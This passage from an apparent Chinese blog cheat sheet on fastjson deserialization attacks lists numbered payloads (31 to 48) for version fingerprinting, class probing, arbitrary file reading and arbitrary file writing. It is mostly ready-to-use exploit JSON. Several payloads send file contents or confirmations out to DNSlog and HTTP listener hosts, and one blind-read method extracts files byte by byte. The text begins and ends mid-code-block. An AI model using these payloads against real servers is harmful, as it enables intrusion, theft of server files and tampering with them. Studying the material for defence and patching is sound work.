{"@type":"com.alibaba.fastjson.JSONObject","a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4/POC","autoCommit":true}}
```
```json
{"@type":"com.alibaba.fastjson.JSONObject","a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1/POC","autoCommit":true}}
```
如果下面比上面响应快，说明版本处于`1.2.9`和`1.2.11`之间。
## 2.4 关键版本探测
### 2.4.1 v1.2.24
直接用`2.3`中所提到的延时判断方法即可。
### 2.4.2 v1.2.47
`payload31`：
```json
{"username":{"@type": "java.net.InetSocketAddress"{"address":,"val":"rylxkswlfg.dgrh3.cn"}}}
```
或者：
```json
[{"@type": "java.lang.Class","val": "java.io.ByteArrayOutputStream"},{"@type": "java.io.ByteArrayOutputStream"},{"@type": "java.net.InetSocketAddress"{"address":,"val":"rylxkswlfg.dgrh3.cn"}}]
```
都是可以的：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697707675616-30cb414f-6521-496f-be36-8b7252761164.png#averageHue=%239ed4d8&clientId=u34d78b8a-7ddf-4&from=paste&height=360&id=ucb7ffd27&originHeight=360&originWidth=1593&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69454&status=done&style=none&taskId=u25859ca7-4de1-4dfe-a78b-1d20660ce40&title=&width=1593)
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697707695032-d625c547-6786-497c-900c-a59d85ae44d2.png#averageHue=%23fdfcfb&clientId=u34d78b8a-7ddf-4&from=paste&height=415&id=ubb4a1593&originHeight=415&originWidth=1908&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38275&status=done&style=none&taskId=ufc952d28-b2bc-4acd-b67f-23804a6e2bc&title=&width=1908)
### 2.4.3 v1.2.68
`payload32`：
```json
[{"@type": "java.lang.AutoCloseable","@type": "java.io.ByteArrayOutputStream"},{"@type": "java.io.ByteArrayOutputStream"},{"@type": "java.net.InetSocketAddress"{"address":,"val": "mwhajokbdd.dgrh3.cn"}}]
```
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697707989609-73940d77-45f0-4a07-9448-f0ccda705efe.png#averageHue=%239dd4d8&clientId=u34d78b8a-7ddf-4&from=paste&height=366&id=u7402334a&originHeight=366&originWidth=1595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68728&status=done&style=none&taskId=u31fd9529-71a3-479d-97cf-b4fcaa17e89&title=&width=1595)![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697708003429-bd5a430a-411c-4b18-9832-102db5693e6c.png#averageHue=%23fdfcfb&clientId=u34d78b8a-7ddf-4&from=paste&height=395&id=ucde1e716&originHeight=395&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31922&status=done&style=none&taskId=u8084db68-d2ae-47c8-9db2-a0c4fa421de&title=&width=1920)
### 2.4.4 v1.2.80与v1.2.83
需要准备两个`dnslog`地址，我这里`yakit`上开一个`dnslog.cn`开一个。
`payload33`：
```json
[{"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","x": {"@type": "java.net.InetSocketAddress"{"address":,"val": "xfjdbd.dnslog.cn"}}},{"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","message": {"@type": "java.net.InetSocketAddress"{"address":,"val": "uawcowbohf.dgrh3.cn"}}}]
```
如果第一个收到响应而第二个没有收到，说明版本为`1.2.80`：
![第一个已收到](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697708407766-7b4f1a89-5189-4f84-875a-eb04a13a43ef.png#averageHue=%23c29856&clientId=u34d78b8a-7ddf-4&from=paste&height=398&id=ud779d855&originHeight=398&originWidth=866&originalType=binary&ratio=1&rotation=0&showTitle=true&size=29524&status=done&style=none&taskId=uad9794d1-5c37-4e52-88c6-4c57c9ddd22&title=%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%B7%B2%E6%94%B6%E5%88%B0&width=866 "第一个已收到")
![第二个未收到](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697708382070-762c5fcc-1922-4f4e-8c3d-f5c37e772445.png#averageHue=%23fdfcfb&clientId=u34d78b8a-7ddf-4&from=paste&height=675&id=u752ee440&originHeight=675&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=true&size=60394&status=done&style=none&taskId=ube07ee45-11b9-41c8-bc8e-e83ac678aac&title=%E7%AC%AC%E4%BA%8C%E4%B8%AA%E6%9C%AA%E6%94%B6%E5%88%B0&width=1920 "第二个未收到")
如果两个都收到了，说明版本是`1.2.83`：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697708530205-814b4c08-2e20-459b-959d-b06391254d72.png#averageHue=%238bc6e2&clientId=u34d78b8a-7ddf-4&from=paste&height=456&id=ubfd0d878&originHeight=456&originWidth=1597&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80015&status=done&style=none&taskId=u936967db-0cf7-4e04-b20b-d5641905dc2&title=&width=1597)
![第一个已收到](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697708573983-a6fb45de-cfd3-467c-8993-dfa58b0275bf.png#averageHue=%23c39d5d&clientId=u34d78b8a-7ddf-4&from=paste&height=434&id=u21031730&originHeight=434&originWidth=786&originalType=binary&ratio=1&rotation=0&showTitle=true&size=32681&status=done&style=none&taskId=u0fabfaf0-d2e4-4226-8826-d16bcb5bbc6&title=%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%B7%B2%E6%94%B6%E5%88%B0&width=786 "第一个已收到")
![第二个已收到](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697708543840-a3a99b6c-0b31-4e57-a416-0182b474e51c.png#averageHue=%23fdfcfc&clientId=u34d78b8a-7ddf-4&from=paste&height=416&id=u0e1aaa33&originHeight=416&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=true&size=31096&status=done&style=none&taskId=u10b69852-d918-4c6e-9a6e-70f922d34ad&title=%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%B7%B2%E6%94%B6%E5%88%B0&width=1920 "第二个已收到")
# 三、探测服务器环境
## 3.1 空值判断法
待探测列表如下：
```
org.springframework.web.bind.annotation.RequestMapping
org.apache.catalina.startup.Tomcat
groovy.lang.GroovyShell
com.mysql.jdbc.Driver
java.net.http.HttpClient
```
`payload34`：
```json
{"z": {"@type": "java.lang.Class","val": "org.springframework.web.bind.annotation.RequestMapping"}}
```
如果系统存在这个类，会返回一个类实例；如果不存在会返回`null`。
例如：
![存在，返回类实例](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697709092447-0077cd01-74c0-49b6-bf29-bdd4e5997560.png#averageHue=%23a2d6d1&clientId=u34d78b8a-7ddf-4&from=paste&height=323&id=u91402718&originHeight=323&originWidth=1600&originalType=binary&ratio=1&rotation=0&showTitle=true&size=63648&status=done&style=none&taskId=u81431106-e26c-4898-b373-47fe7111cff&title=%E5%AD%98%E5%9C%A8%EF%BC%8C%E8%BF%94%E5%9B%9E%E7%B1%BB%E5%AE%9E%E4%BE%8B&width=1600 "存在，返回类实例")
![不存在，返回空值](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697709524535-60a323c8-ae51-4de2-85ee-1b549fdbc79e.png#averageHue=%2384c1dd&clientId=u34d78b8a-7ddf-4&from=paste&height=446&id=u70f4b72a&originHeight=446&originWidth=1593&originalType=binary&ratio=1&rotation=0&showTitle=true&size=60566&status=done&style=none&taskId=u065e5dbb-5654-4a7e-921a-4106461360c&title=%E4%B8%8D%E5%AD%98%E5%9C%A8%EF%BC%8C%E8%BF%94%E5%9B%9E%E7%A9%BA%E5%80%BC&width=1593 "不存在，返回空值")
## 3.2 dnslog回显判断法
`payload35`：
```json
{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":{"@type":"java.lang.String"{1:{"@type":"java.lang.Class","val":"com.mysql.jdbc.Driver"}},"country":"aaa.qmc8xj4s.dnslog.pw"}}}
```
只有`MacOS`可以`ping`带花括号的域名，`Linux`和`Windows`会报错，所以该`payload`需要特定环境才可以。
## 3.3 报错回显判断法
`payload36`：
```json
{"x": {"@type": "java.lang.Character"{"@type": "java.lang.Class","val": "com.mysql.jdbc.Driver"}}
```
![报错](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697766482187-414c1b41-2d60-4b08-bb6e-a631f8579b1c.png#averageHue=%239fd5d6&clientId=uaa1753b3-0a32-4&from=paste&height=350&id=u3425e5a6&originHeight=350&originWidth=1591&originalType=binary&ratio=1&rotation=0&showTitle=true&size=67695&status=done&style=none&taskId=u717287d6-43e6-4a12-b197-bcc5bca16b5&title=%E6%8A%A5%E9%94%99&width=1591 "报错")
![不报错](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697766568952-dc4b6166-67a6-481e-a096-94484b44711c.png#averageHue=%2326282b&clientId=uaa1753b3-0a32-4&from=paste&height=992&id=u18c72fcf&originHeight=992&originWidth=1384&originalType=binary&ratio=1&rotation=0&showTitle=true&size=168392&status=done&style=none&taskId=u14974c3f-6c1e-4ccf-bf6f-9d70e272516&title=%E4%B8%8D%E6%8A%A5%E9%94%99&width=1384 "不报错")
# 四、文件读取

## 4.1 fastjson【1.2.73<=version<=1.2.80】

### 4.1.1 aspectjtools

#### 4.1.1.1 直接回显法

`payload37`（组合拳）：
可以分三次打：
```json
{
    "@type":"java.lang.Exception",
    "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"
}
```
```json
{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{ "@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]}}}
```
```json
{
    "username":{
        "@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit",
        "@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit",
        "fileName":"c:/windows/win.ini"
    },
    "password":"admin"
}
```
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697804625231-87224295-ec38-46e5-ae91-73f142cb9096.png#averageHue=%23bcdfd2&clientId=u1f249710-f72c-4&from=paste&height=1040&id=ub8a67470&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=165082&status=done&style=none&taskId=uaaccb6ad-e465-4428-ba7e-47f51d5580a&title=&width=1920)
也可以直接利用`JSON.parse`可以解析`[]`的特性直接一次打：
```json
[{"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"},{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]}}},{"username":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"c:/windows/win.ini"},"password":"admin"}]
```

![image-20231020204958021](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231020204958021.png)

#### 4.1.1.2 报错回显法

`payload38`：

```json
[{"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"},{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]}}},{"username":{"@type":"java.lang.Character"{"c":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"c:/windows/win.ini"}},"password":"admin"}]
```

![image-20231020212607508](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231020212607508.png)

#### 4.1.1.3 dnslog回显法（需要对方为mac环境且dnslog平台支持特殊符号）

`payload39`：

```json
[{"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"},{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]}}},{"username":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"1.txt"},"password":{"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type": "java.lang.String""@type":"java.util.Locale","language":{"@type":"java.lang.String"{"$ref":"$"},"country":"aaa.qmc8xj4s.dnslog.pw"}}}}]
```

但是只有`mac`才支持`ping`带花括号的域名，所以我`Windows`这里会提示`deserialize inet adress error`：

![image-20231020213159191](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231020213159191.png)

#### 4.1.1.4 httplog回显法（另需ognl>=2.7以及commons-io>=2.0）

分两次打。

`payload40`（组合拳）：

```json
[{"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"},{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]}}},{"username":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"test"},"password":"admin"}]
```

```json
{"su14":{"@type":"java.lang.Exception","@type":"ognl.OgnlException"},"su15":{"@type":"java.lang.Class","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"ognl.OgnlException","_evaluation":""}},"su16":{"@type":"ognl.Evaluation","node":{"@type":"ognl.ASTMethod","p":{"@type":"ognl.OgnlParser","stream":{"@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"java.util.Locale","language":"http://127.0.0.1:8085/?test","country":{"@type":"java.lang.String"[{"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"C:/Windows/win.ini"}]}}},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[36]}]}}}},"su17":{"$ref":"$.su16.node.p.stream"},"su18":{"$ref":"$.su17.bOM.bytes"}}
```

我这里实际测试过程中，文件中有中文字符的时候出现了乱码：

![image-20231020223219033](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231020223219033.png)

我的解决方法是，使用`yakit`的端口监听器：

![image-20231020223341147](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231020223341147.png)

`yakit`真是太好用了，有木有~

### 4.1.2 aspectjtools+xalan（>=2.4.0）+dom4j（版本无限制）

#### 4.1.2.1 直接回显法

分五次打，中间报错不用管。

`payload41`（组合拳）：

```json
[{"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"},{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]}}},{"username":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"test"},"password":"admin"}]
```

```json
{"@type":"java.lang.Exception","@type":"org.apache.xml.dtm.DTMConfigurationException","locator":{}}
```

```json
{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.apache.xml.dtm.DTMConfigurationException","locator":{}}}}
```

```json
{"su14":{"@type":"javax.xml.transform.SourceLocator","@type":"org.apache.xpath.objects.XNodeSetForDOM","nodeIter":{"@type":"org.apache.xpath.NodeSet"},"xctxt":{"@type":"org.apache.xpath.XPathContext","primaryReader":{"@type":"org.dom4j.io.XMLWriter","entityResolver":{"@type":"org.dom4j.io.SAXContentHandler","inputSource":{"byteStream":{"@type":"java.io.InputStream"}}}}}}}
```

```json
{"su15":{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"file:///C:/Users/whoami/Desktop/testtest.txt"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[98]}]}}
```

![image-20231021152553230](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231021152553230.png)

#### 4.1.2.2 httplog回显法

修改`4.1.2.1`中最后一步为如下`payload`：


```json
{"@type":"java.io.InputStream","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"java.util.Locale","language":"http://127.0.0.1:8085/?test","country":{"@type":"java.lang.String"[{"@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"C:/Users/whoami/Desktop/testtest.txt"}]}}},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[98]}]}
```

我这里`demo`复现是成功的，但是靶场没有成功，如果有兄弟成功了可以公众号后台直接发消息，我看到立马就会回复，并将这部分在我的博客中更新。



## 4.2 fastjson【1.2.37<=version<=1.2.68】

### 4.2.1 blackhat2021-getBom()原版（适用场景有限）

`payload42`：

```json
{
  "abc":{"@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///C:/Windows/win.ini"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },"boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [
          59
        ]
      }
    ]
  },
  "address" : {"$ref":"$.abc.BOM"}
}
```

![image-20231021003605584](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231021003605584.png)

> 它会拿`win.ini`的内容转成`int`数组，然后拿`ByteOrderMark`里的`bytes`挨个字节遍历去比对，如果遍历过程有比对错误的`getBom`就会返回一个`null`，如果遍历结束，没有比对错误那就会返回一个`ByteOrderMark`对象。所以这里文件读取成功的标志应该是`getBom`返回结果不为`null`。

有点`sql`注入中布尔盲注的味道，哈哈。

附上读取文件内容到字节数组的代码：

```java
import java.io.FileReader;
import java.io.IOException;

public class str2bytes {
    public static String fileToString(String path) throws IOException {
        FileReader reader = new FileReader(path);
        StringBuilder stringBuilder = new StringBuilder();
        char[] buffer = new char[10];
        int size;
        while ((size = reader.read(buffer)) != -1) {
            stringBuilder.append(buffer, 0, size);
        }
        return stringBuilder.toString();
    }

    public static void main(String[] args) throws IOException {
        String str = fileToString("C:\\Windows\\win.ini");
        byte[] byteArray = str.getBytes("UTF-8");
        boolean first = true;
        for (byte b : byteArray) {
            int intValue = b & 0xFF;
            if (first) {
                System.out.print(intValue);
                first = false;
            } else {
                System.out.print(", " + intValue);
            }
        }
    }
}

//59, 32, 102, 111, 114, 32, 49, 54, 45, 98, 105, 116, 32, 97, 112, 112, 32, 115, 117, 112, 112, 111, 114, 116, 13, 10, 91, 102, 111, 110, 116, 115, 93, 13, 10, 91, 101, 120, 116, 101, 110, 115, 105, 111, 110, 115, 93, 13, 10, 91, 109, 99, 105, 32, 101, 120, 116, 101, 110, 115, 105, 111, 110, 115, 93, 13, 10, 91, 102, 105, 108, 101, 115, 93, 13, 10, 91, 77, 97, 105, 108, 93, 13, 10, 77, 65, 80, 73, 61, 49, 13, 10
```

### 4.2.2 blackhat2021-getBom()浅蓝师傅改版（几乎适配所有场景）

`payload43`：

```json
{"abc":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"file:///C:/Users/whoami/Desktop/testtest.txt"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[98]}]},"address":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String"{"$ref":"$.abc.BOM[0]"},"start":0,"end":0},"xxx":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"http://testhhh.okdplvnqdu.dgrh3.cn/"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[1]}]},"zzz":{"$ref":"$.xxx.BOM[0]"}}
```

![image-20231021010244056](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231021010244056.png)

极端场景：有一个接口，用`fastjson`解析了`json`，但不会反馈任何能够作为状态判断的标识，连异常报错的信息都没有。

那么此时该`payload`就可以派上用场了，**如果以上`poc`收到了`dnslog`响应，那么说明字节码比对失败**，也就是第一个字节的`int`值不等于我们填入的那个数字（比如这里的`98`，此时我们就得更改数字继续测试）；如果没收到，说明比对成功，继续测试即可。

### 4.2.3 blackhat2021-getBom() tyskill师傅改版（几乎适配所有场景）

`payload44`：

```json
{"abc":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"file:///C:/Users/whoami/Desktop/testtest.txt"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[98,]}]},"address":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"http://192.168.161.4:8085/"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"$ref":"$.abc.BOM[0]"}]},"xxx":{"$ref":"$.address.BOM[0]"}}
```

该`payload`是浅蓝师傅的`payload`的改版，主要区别在于这个是`dnslog`或者`http`服务有响应说明字节码比对成功，和浅蓝的那个是反着来的。

![image-20231021115924790](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231021115924790.png)

![image-20231021115937822](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231021115937822.png)

# 五、文件写入

## 5.1 commons-io 2.x（1.2.37<=version<=1.2.68）

### 5.1.1 最初公开的payload（只能在centos下利用）

`payload45`：

```json
{
    "x":{
        "@type":"java.lang.AutoCloseable",
        "@type":"sun.rmi.server.MarshalOutputStream",
        "out":{
            "@type":"java.util.zip.InflaterOutputStream",
            "out":{
                "@type":"java.io.FileOutputStream",
                "file":"C:/Users/whoami/Desktop/testtesttest.txt",
                "append":false
            },
            "infl":{
                "input":"SGVsbG8sIFcwMWZoNGNrZXIh"
            },
            "bufLen":1048576
        },
        "protocolVersion":1
    }
}
```

`Windows`下利用会报错，只能在目标是`centos`的情况下使用：

![image-20231021200857762](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231021200857762.png)

至于为什么会这样，请参考以下文章，写的很清楚很明白，在此不再赘述：

> https://www.cnblogs.com/zpchcbd/p/14969606.html

### 5.1.2 commons-io 2.0~2.6版本

`payload46`：

需要注意，需要修改下面的`W01fh4ckeraaaaaa...`为自己想要写入的内容，需要注意的是，**长度要大于`8192`，实际写入前`8192`个字符**！具体原因请参考下面的文章，文章里面写的非常清楚：

> https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg

```json
{"x":{"@type":"com.alibaba.fastjson.JSONObject","input":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String""W01fh4ckeraaaaaa..."},"charsetName":"UTF-8","bufferSize":1024},"branch":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.output.WriterOutputStream","writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"W01fh4cker.txt","encoding":"UTF-8","append":false},"charsetName":"UTF-8","bufferSize":1024,"writeImmediately":true},"trigger":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","is":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"trigger2":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","is":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"trigger3":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","is":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"}}}
```

![image-20231021202206100](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231021202206100.png)

### 5.1.3 commons-io 2.7~2.8.0版本

和上面大差不差，同样需要自行修改写入内容。

`payload47`：

```json
{"x":{"@type":"com.alibaba.fastjson.JSONObject","input":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String""W01fh4ckeraaaaaa...","start":0,"end":2147483647},"charsetName":"UTF-8","bufferSize":1024},"branch":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.output.WriterOutputStream","writer":{"@type":"org.apache.commons.io.output.FileWriterWithEncoding","file":"2.txt","charsetName":"UTF-8","append":false},"charsetName":"UTF-8","bufferSize":1024,"writeImmediately":true},"trigger":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"trigger2":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"},"trigger3":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.TeeInputStream","input":{"$ref":"$.input"},"branch":{"$ref":"$.branch"},"closeBranch":true},"httpContentType":"text/xml","lenient":false,"defaultEncoding":"UTF-8"}}}
```

![image-20231021210955565](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/image-20231021210955565.png)

## 5.2 ognl+commons-io 2.x（1.2.73<=version<=1.2.80）

### 5.2.1 ognl+commons-io 2.0~2.6版本

`payload48`：

同样是省略了一堆`a`，需要自行修改补充。

```json
